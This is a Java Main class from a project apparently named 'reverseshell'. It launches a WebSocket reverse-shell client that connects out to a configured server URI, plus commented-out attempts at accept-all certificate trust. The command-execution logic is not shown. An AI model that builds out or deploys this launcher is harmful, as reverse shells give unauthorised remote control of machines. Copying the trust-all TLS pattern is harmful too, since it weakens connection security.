package com.mtattab.reverseshell;


import com.mtattab.reverseshell.service.impl.WebsocketReverseShellServiceImpl;
import com.mtattab.reverseshell.util.Constants;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.TrustManagerFactory;

import org.java_websocket.handshake.ServerHandshake;
import java.net.URI;
public class Main {

    
    public static void main(String[] args) {
        System.out.println("hello");
        try {
            // Replace with the WebSocket server URL
            WebsocketReverseShellServiceImpl client = new WebsocketReverseShellServiceImpl(
                    new URI(Constants.LOCAL_SERVER_WEBSOCKET_URI));
            // Create an SSL context that accepts self-signed certificates
            SSLContext sslContext = SSLContext.getInstance("TLS");

//            sslContext.init();
//            sslContext.init(null, TrustManagerFactory.getInstance());
//            sslContext.init(null, TrustManagerUtils.getAcceptAllTrustManagers(), null);

        //            SecureWebSocketClient client = new SecureWebSocketClient(serverUri);


            client.setSocket(sslContext.getSocketFactory().createSocket());

            client.connect();
            System.out.println(client.isOpen());
            while (!client.isOpen()) {
                Thread.sleep(1000); // Wait for a second before checking again
                System.out.println(client.isOpen());

            }
            client.send("sssss");
        } catch (Exception e) {

            e.printStackTrace();
        }
        System.out.println("hello");

            

    }
}
